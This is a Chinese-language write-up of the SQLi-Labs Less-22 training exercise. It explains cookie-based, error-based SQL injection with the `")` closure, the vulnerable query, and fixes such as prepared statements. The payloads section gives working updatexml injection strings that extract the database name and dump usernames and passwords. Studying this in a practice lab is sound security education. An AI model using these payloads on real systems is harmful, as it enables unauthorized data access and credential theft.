# SQLi-Labs | Less-22 Cookie注入 双引号 ") 报错注入
## 一、漏洞简介
Cookie注入，Cookie中的uname参数被 `("$cookee")` 包裹，闭合符号为 `")`。需要先登录获取Cookie，页面支持报错回显，使用updatexml报错注入脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-22/
注入类型：Cookie注入、字符型、")闭合、报错注入
## 三、复现步骤
1. admin/admin登录，抓包拿到Cookie：uname=admin。
2. 修改Cookie的uname，填入 `admin")`，提交后页面报错，确认闭合为 `")`。
3. 构造报错注入payload，放入Cookie，发送请求，通过报错提取数据。
## 四、Payload
获取库名：
Cookie: uname=admin") and updatexml(1,concat(0x7e,database(),0x7e),1) --+
获取users表账号密码：
Cookie: uname=admin") and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+
## 五、漏洞原理
后端SQL语句：
`SELECT * FROM users WHERE username=("$cookee") LIMIT 0,1`
Cookie参数直接拼接，信任客户端传入的Cookie值，没有任何安全校验，可控输入闭合双引号与括号，注入SQL。
## 六、修复方案
1. Cookie身份凭证加密签名，禁止明文可篡改。
2. 采用预编译查询，杜绝SQL字符串拼接。
3. 关闭数据库详细错误输出，过滤危险字符。
## 七、总结
Less22是Cookie注入最后一关，闭合为 `")`，和Less12、Less16的闭合形式一致，只是注入点从表单转移到Cookie。